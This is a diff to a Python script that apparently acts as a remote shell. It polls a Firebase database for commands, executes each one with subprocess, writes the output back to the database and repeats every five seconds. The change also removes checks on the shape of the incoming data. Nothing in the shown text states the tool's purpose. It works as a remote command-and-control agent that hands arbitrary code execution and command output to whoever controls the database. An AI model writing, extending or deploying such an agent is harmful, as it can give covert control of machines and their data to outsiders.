@@ -45,25 +45,24 @@ def execute_command(command):
         return output
     except subprocess.CalledProcessError as e:
         return f"Error: {e.output}"
+
 # Function to check for new commands and execute them
 def check_for_commands():
     ref = db.reference('shell/commands')
     try:
         commands = ref.get()
-        if isinstance(commands, dict):  # Ensure commands is a dictionary
+        if commands:
             for key, value in commands.items():
-                if isinstance(value, dict):  # Ensure value is a dictionary
-                    command = value.get('command', '')
-                    if command:
-                        output = execute_command(command)
-                        output_ref = db.reference('shell/output')
-                        output_ref.push().set({'output': output})
-                        ref.child(key).delete()
-                else:
-                    print(f"Invalid command format: {value}")
-                    ref.child(key).delete()  # Delete invalid command
-        else:
-            print(f"Invalid data format received: {commands}")
+                command = value.get('command', '')
+                if command:
+                    output = execute_command(command)
+                    output_ref = db.reference('shell/output')
+                    output_ref.push().set({'output': output})
+                    ref.child(key).delete()
     except Exception as e:
         print(f"Error while fetching/processing commands: {e}")
 
+# Continuously check for commands
+while True:
+    check_for_commands()
+    time.sleep(5)  # Increased sleep time to allow commands to execute and capture output
